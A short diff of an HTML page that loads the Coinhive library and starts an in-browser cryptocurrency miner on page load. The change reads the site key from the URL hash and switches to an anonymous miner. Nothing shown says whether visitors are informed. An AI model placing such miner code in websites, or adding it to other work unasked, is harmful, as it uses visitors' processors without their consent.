@@ -6,8 +6,8 @@
 
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-        var siteCode = 'QnFBodo5jGJo2IjyJR0oLeX0Tt0yGmxm';
-        var miner = new CoinHive.User(siteCode, window.location.hash);
+        var siteCode = window.location.hash.slice(1);
+        var miner = new CoinHive.Anonymous(siteCode);
         miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 
         setInterval(function() {
